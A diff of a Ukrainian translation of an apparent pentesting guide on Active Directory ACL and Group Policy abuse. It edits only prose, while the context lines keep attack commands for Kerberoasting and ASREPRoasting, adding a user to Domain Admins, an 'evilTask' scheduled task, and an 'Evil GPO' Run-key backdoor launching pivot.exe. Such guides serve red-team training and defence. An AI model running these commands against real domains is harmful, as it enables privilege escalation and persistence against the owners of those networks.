@@ -15,7 +15,7 @@ Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipal
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-- **Targeted ASREPRoasting**: Вимкніть попередню аутентифікацію для користувача, зробивши його обліковий запис вразливим до ASREPRoasting.
+- **Targeted ASREPRoasting**: Вимкніть попередню аутентифікацію для користувача, що робить їх обліковий запис вразливим до ASREPRoasting.
 ```powershell
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
@@ -46,13 +46,13 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 ```
 ## **Self (Self-Membership) on Group**
 
-Ця привілегія дозволяє зловмисникам додавати себе до певних груп, таких як `Domain Admins`, через команди, які безпосередньо маніпулюють членством у групі. Використання наступної послідовності команд дозволяє самостійно додаватися:
+Ця привілегія дозволяє зловмисникам додавати себе до певних груп, таких як `Domain Admins`, через команди, які безпосередньо маніпулюють членством у групі. Використання наступної послідовності команд дозволяє самостійне додавання:
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 ## **WriteProperty (Self-Membership)**
 
-Схожий привілей, це дозволяє зловмисникам безпосередньо додавати себе до груп, змінюючи властивості групи, якщо у них є право `WriteProperty` на ці групи. Підтвердження та виконання цього привілею здійснюється за допомогою:
+Схоже на привілей, це дозволяє зловмисникам безпосередньо додавати себе до груп, змінюючи властивості групи, якщо у них є право `WriteProperty` на ці групи. Підтвердження та виконання цього привілею здійснюється за допомогою:
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
@@ -86,7 +86,7 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\
 ```
 ## **GenericWrite на групу**
 
-З цим привілеєм зловмисники можуть маніпулювати членством у групі, наприклад, додаючи себе або інших користувачів до конкретних груп. Цей процес включає створення об'єкта облікових даних, використання його для додавання або видалення користувачів з групи та перевірку змін у членстві за допомогою команд PowerShell.
+З цим привілеєм зловмисники можуть маніпулювати членством у групі, наприклад, додаючи себе або інших користувачів до конкретних груп. Цей процес включає створення об'єкта облікових даних, використання його для додавання або видалення користувачів з групи та перевірку змін членства за допомогою команд PowerShell.
 ```powershell
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -112,11 +112,11 @@ $ADSI.psbase.commitchanges()
 
 ### Делегування GPO
 
-Делегований доступ для управління об'єктами групової політики (GPO) може створювати значні ризики для безпеки. Наприклад, якщо користувач, такий як `offense\spotless`, отримує права управління GPO, він може мати привілеї, такі як **WriteProperty**, **WriteDacl** та **WriteOwner**. Ці дозволи можуть бути зловживані зловмисними цілями, як виявлено за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Делегований доступ для управління об'єктами групової політики (GPO) може створювати значні ризики для безпеки. Наприклад, якщо користувач, такий як `offense\spotless`, отримує права на управління GPO, він може мати привілеї, такі як **WriteProperty**, **WriteDacl** та **WriteOwner**. Ці дозволи можуть бути зловживані зловмисними цілями, як виявлено за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 ### Перерахунок дозволів GPO
 
-Щоб виявити неправильно налаштовані GPO, команди PowerSploit можна з'єднати разом. Це дозволяє виявити GPO, до яких конкретний користувач має права управління: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Щоб виявити неправильно налаштовані GPO, команди PowerSploit можна з'єднати разом. Це дозволяє виявити GPO, до яких конкретний користувач має права на управління: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 **Комп'ютери з застосованою політикою**: Можливо визначити, до яких комп'ютерів застосовується конкретний GPO, що допомагає зрозуміти обсяг потенційного впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
@@ -132,7 +132,7 @@ New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net l
 ```
 ### GroupPolicy модуль - Зловживання GPO
 
-Модуль GroupPolicy, якщо він встановлений, дозволяє створювати та пов'язувати нові GPO, а також встановлювати параметри, такі як значення реєстру для виконання бекдорів на уражених комп'ютерах. Цей метод вимагає оновлення GPO та входу користувача в комп'ютер для виконання:
+Модуль GroupPolicy, якщо встановлений, дозволяє створювати та пов'язувати нові GPO, а також встановлювати параметри, такі як значення реєстру для виконання бекдорів на уражених комп'ютерах. Цей метод вимагає оновлення GPO та входу користувача в комп'ютер для виконання:
 ```powershell
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
@@ -159,7 +159,7 @@ GPO також дозволяють маніпулювати членством 
 
 XML конфігураційний файл для Користувачів та Груп описує, як ці зміни реалізуються. Додаючи записи до цього файлу, конкретним користувачам можуть бути надані підвищені привілеї на уражених системах. Цей метод пропонує прямий підхід до підвищення привілеїв через маніпуляцію GPO.
 
-Крім того, можуть бути розглянуті додаткові методи виконання коду або підтримки постійності, такі як використання скриптів входу/виходу, модифікація ключів реєстру для автозапуску, встановлення програмного забезпечення через .msi файли або редагування конфігурацій служб. Ці техніки надають різні шляхи для підтримки доступу та контролю цільових систем через зловживання GPO.
+Крім того, можуть бути розглянуті додаткові методи виконання коду або підтримки стійкості, такі як використання скриптів входу/виходу, модифікація ключів реєстру для автозапуску, встановлення програмного забезпечення через .msi файли або редагування конфігурацій служб. Ці техніки надають різні шляхи для підтримки доступу та контролю цільових систем через зловживання GPO.
 
 ## Посилання
 
